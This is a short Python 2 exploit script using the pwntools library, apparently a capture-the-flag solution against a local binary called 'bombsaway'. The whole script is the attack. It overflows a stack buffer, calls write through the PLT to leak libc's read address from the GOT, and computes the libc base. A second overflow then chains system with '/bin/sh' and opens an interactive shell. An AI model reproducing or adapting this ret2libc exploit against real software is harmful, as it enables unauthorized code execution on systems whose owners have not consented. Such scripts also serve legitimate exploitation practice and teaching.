from pwn import *
from struct import pack, unpack


def pwn():
    p = lambda x : pack("I",x)
    r = process('./bombsaway')
    print r.recv()
    r.sendline('test')
    print r.recv()
    r.sendline('2')
    print r.recv()
    payload = 'A'*556
    payload += p32(0x080483b0) # plt of write
    payload += p32(0x08048400) # ret
    payload += p32(0x1)
    payload += p32(0x080f700c) # read in got
    payload += p32(0x4) #leak

    r.sendline(payload)
    rec = r.recvuntil('Password:')
    print rec
    i = 40
    rec = rec[i:i+4]
    read_libc = unpack('I', rec)[0]
    print '[+] Libc addr of read: '+hex(read_libc)
    libc_base = read_libc-0x0e5620
    print '[+] Libc base: '+hex(libc_base)
    sys = p(libc_base+0x03cd10)
    lol = p(libc_base+0x123456)
    binsh = p(libc_base+0x17b8cf)
    r.sendline('test')
    r.recvuntil('Option:')
    r.sendline('2')
    r.recvuntil(':')
    fpayload = 'A'*544
    fpayload += sys
    fpayload += lol
    fpayload += binsh
    r.sendline(fpayload)
    r.interactive()

pwn()
